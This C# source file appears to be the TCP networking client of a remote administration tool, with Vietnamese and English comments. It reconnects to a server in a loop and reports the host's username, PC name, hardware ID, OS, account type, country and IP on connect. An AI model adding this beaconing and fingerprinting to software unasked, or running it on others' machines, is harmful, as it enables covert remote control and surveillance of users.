using Client.Helper;
using Client.IO;
using Client.IpGeoLocation;
using Client.Networking.Packets.ClientServices;
using Client.User;
using Client.Utilities;
using Common.Helper;
using Common.Networking;
using Common.Utilities;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks.Dataflow;

namespace Client.Networking
{
    /// <summary>
    /// Client kết nối đến Server sử dụng giao thức TCP/IP
    /// Connects to Server using TCP/IP protocol
    /// </summary>
    public class Client : IDisposable
    {
        public bool Connected { get; private set; }
        public SingleInstanceMutex ApplicationMutex;

        private TcpClient _tcpClient; // TCP Client để thiết lập kết nối TCP/IP
        private ProcessStream _stream;
        private ClientHandler _handler;
        private readonly CancellationTokenSource cancellationSource = new();
        private bool disposed;
        private readonly BufferBlock<IRequestPacket> packetQueue;

        #region Event
        public delegate void ClientFailEventHandler(Client s, Exception ex);
        public event ClientFailEventHandler ClientFail;
        private void OnClientFail(Exception ex)
        {
            var handler = ClientFail;
            handler?.Invoke(this, ex);
        }

        public delegate void ClientStateEventHandler(Client s, bool connected);
        public event ClientStateEventHandler ClientState;
        private void OnClientState(bool connected)
        {
            if (Connected == connected) return;

            Connected = connected;

            var handler = ClientState;
            handler?.Invoke(this, connected);
        }
        #endregion

        public Client(FrmMain application)
        {
            _handler = new(application, this);

            var linkOptions = new DataflowLinkOptions { PropagateCompletion = true };
            var blockOptions = new ExecutionDataflowBlockOptions { CancellationToken = cancellationSource.Token, EnsureOrdered = true };//có thể dừng việc gửi packet bất cứ lúc nào bằng cách gọi cancellationSource.Cancel().
            //ActionBlock là một block xử lý dữ liệu
            var sendPacketBlock = new ActionBlock<IRequestPacket>(packet =>
            {
                if (Connected)
                    SendPacket(packet);// gửi packet đi
            }, blockOptions);

            packetQueue = new BufferBlock<IRequestPacket>(blockOptions);//hàng đợi packet
            _ = packetQueue.LinkTo(sendPacketBlock, linkOptions);//LinkTo nối packetQueue (nguồn) với sendPacketBlock (đích)
        }
        public void Connect(IPAddress ip, int port)
        {
            while (!cancellationSource.IsCancellationRequested)
            {
                if (!Connected)
                {
                    TcpClient handle = null;
                    try
                    {
                        // Tạo TCP Client và thiết lập kết nối TCP/IP đến server
                        // Create TCP Client and establish TCP/IP connection to server
                        _tcpClient = new TcpClient();
                        _tcpClient.Connect(ip, port); // Kết nối TCP/IP

                        if (_tcpClient.Connected)
                        {
                            _stream = new ProcessStream(_tcpClient.GetStream());//_tcpClient.GetStream() trả về NetworkStream
                            _ = ProcessAsync();//_ để nó chạy song song ( chạy ngầm)
                            OnClientState(true);
                            var geoInfo = GeoInformationFactory.GetGeoInformation();
                            var userAccount = new UserAccount();
                            SendPacket(new IdentifyClientPacket
                            {
                                OperatingSystem = PlatformHelper.FullName,
                                AccountType = userAccount.Type.ToString(),
                                Country = geoInfo.Country,
                                CountryCode = geoInfo.CountryCode,
                                HardwareId = HardwareDevices.HardwareId,
                                Username = userAccount.UserName,
                                PcName = SystemHelper.GetPcName(),
                                IpAddress = geoInfo.IpAddress,
                            });
                        }
                        else
                        {
                            _tcpClient.Dispose();
                        }
                    }
                    catch (Exception ex)
                    {
                        _tcpClient?.Dispose();
                        OnClientFail(ex);
                    }
                }
                while (Connected)
                {
                    try
                    {
                        cancellationSource.Token.WaitHandle.WaitOne(1000);
                    }
                    catch (Exception e) when (e is NullReferenceException || e is ObjectDisposedException)
                    {
                        Disconnect();
                        return;
                    }
                }

                if (cancellationSource.IsCancellationRequested)
                {
                    Disconnect();
                    return;
                }
                _tcpClient?.Dispose();

                Thread.Sleep(1000);
            }

        }

        private async Task ProcessAsync()
        {
            while (!cancellationSource.IsCancellationRequested && _tcpClient.Connected)
            {
                try
                {
                    (var id, var data) = await GetNextPacketAsync();
                    _ = _handler.HandlePackets(id, data);
                }
                catch (Exception e)
                {

                }
            }
            Connected = false;
        }

        private async Task<(int id, byte[] data)> GetNextPacketAsync()//lấy packet tiếp theo từ stream (NetworkStream)
        {
            var length = await _stream.ReadIntAsync();

            if (length <= 0)
                return (0, new byte[0]);

            var receivedData = new byte[length];

            Thread.Sleep(10);
            _ = await _stream.ReadAsync(receivedData.AsMemory(0, length));

            var packetId = 0;
            var packetData = Array.Empty<byte>();

            await using (var packetStream = new ProcessStream(receivedData))
            {
                try
                {
                    packetId = await packetStream.ReadIntAsync();
                    var arlen = 0;

                    if (length - 4 > -1)
                        arlen = length - 4;

                    packetData = new byte[arlen];
                    _ = await packetStream.ReadAsync(packetData.AsMemory(0, packetData.Length));
                }
                catch
                {
                    throw;
                }
            }

            return (packetId, packetData);// trả về id và data của packet
        }

        public void SendPacket(IRequestPacket packet)
        {
            try
            {
                packet.Serialize(_stream);
            }
            catch (SocketException)
            {
                if (!_tcpClient.Connected)
                {
                    Disconnect();
                }
            }
        }
        internal async Task QueuePacketAsync(IRequestPacket packet)
        {
            _ = await packetQueue.SendAsync(packet); //gửi packet vào hàng đợi 
        }

        public void Exit()
        {
            cancellationSource.Cancel();
            Disconnect();
        }

        public void Disconnect()
        {
            if (_stream != null)
            {
                _stream.Close();
            }

            OnClientState(false);
        }

        public void Dispose()
        {
            if (disposed)
                return;

            disposed = true;

            cancellationSource?.Dispose();
            _stream?.Dispose();
            _handler?.Dispose();

            GC.SuppressFinalize(this);
        }
    }
}
